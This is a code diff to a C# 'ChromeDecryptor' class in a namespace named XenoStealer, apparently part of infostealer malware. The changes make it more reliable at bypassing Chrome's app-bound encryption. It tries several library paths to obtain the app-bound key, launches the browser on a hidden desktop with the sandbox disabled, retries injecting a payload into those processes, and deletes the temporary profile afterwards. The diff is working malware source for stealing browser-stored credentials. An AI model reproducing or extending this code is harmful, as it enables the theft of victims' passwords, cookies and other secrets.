@@ -22,7 +22,7 @@ namespace XenoStealer
 
         public bool operational = false;
 
-        public ChromeDecryptor(string UserDataPath, string libraryPath) 
+        public ChromeDecryptor(string UserDataPath, string[] possibleLibraryPaths) 
         {
             if (!UserDataPath.EndsWith("Local State")) 
             {
@@ -30,13 +30,20 @@ namespace XenoStealer
             }
             masterKey = GetMasterKey(UserDataPath);
             operational= masterKey!=null;
-            if (!operational) 
+            if (!operational)
             {
                 return;
             }
-            if (libraryPath != null)
+            if (possibleLibraryPaths != null)
             {
-                appBoundPrivateKey = GetAppBoundKey(UserDataPath, libraryPath);
+                foreach (string path in possibleLibraryPaths)
+                {
+                    appBoundPrivateKey = GetAppBoundKey(UserDataPath, path);
+                    if (appBoundPrivateKey != null) 
+                    {
+                        break;
+                    }
+                }
             }
 
         }
@@ -98,7 +105,9 @@ namespace XenoStealer
                         return null;
                     }
 
-                    string commandLine = $"\"{LibraryPath}\" --no-sandbox --allow-no-sandbox-job --disable-gpu --mute-audio --disable-audio --user-data-dir=\"{Utils.GetTemporaryDirectory()}\"";
+                    string tempUserDirectory = Utils.GetTemporaryDirectory();
+
+                    string commandLine = $"\"{LibraryPath}\" --no-sandbox --allow-no-sandbox-job --disable-gpu --mute-audio --disable-audio --user-data-dir=\"{tempUserDirectory}\"";
 
                     foreach (int pid in Utils.GetAllProcessOnDesktop(InjectionDesktopName)) 
                     { 
@@ -111,7 +120,8 @@ namespace XenoStealer
                         return null;
                     }
 
-                    Thread.Sleep(100);
+                    Thread.Sleep(300);//wait for process to fully launch
+
                     int[] pids = Utils.GetAllProcessOnDesktop(InjectionDesktopName);
                     if (pids.Length == 0) 
                     {
@@ -130,15 +140,26 @@ namespace XenoStealer
 
                     bool injected = false;
 
-                    foreach (int pid in pids) 
+                    int maxTries = 5;
+                    int currentTry = 0;
+                    while (true)
                     {
-                        if (SharpInjector.Inject(pid, InjectionEntryPointDONOTCALL, 2000, payload) == SharpInjector.InjectionStatusCode.SUCCESS) 
+                        foreach (int pid in pids)
                         {
-                            injected= true;
+                            if (SharpInjector.Inject(pid, InjectionEntryPointDONOTCALL, 2000, payload) == SharpInjector.InjectionStatusCode.SUCCESS)
+                            {
+                                injected = true;
+                                break;
+                            }
+                        }
+                        if (currentTry >= maxTries || injected) 
+                        {
                             break;
                         }
+                        Thread.Sleep(100);
+                        pids = Utils.GetAllProcessOnDesktop(InjectionDesktopName);
+                        currentTry++;
                     }
-
                     if (!injected) 
                     {
                         foreach (int pid in Utils.GetAllProcessOnDesktop(InjectionDesktopName))
@@ -174,6 +195,11 @@ namespace XenoStealer
                     }
 
                     NativeMethods.CloseDesktop(desktopHandle);
+
+                    try 
+                    {
+                        Directory.Delete(tempUserDirectory, true);
+                    } catch { }
 
                     return returnData;
 
@@ -295,6 +321,8 @@ namespace XenoStealer
             byte[] bytes = new byte[byteLength];
 
             Marshal.Copy(data, bytes, 0, byteLength);
+
+            Marshal.FreeBSTR(data);
 
             return bytes;
 
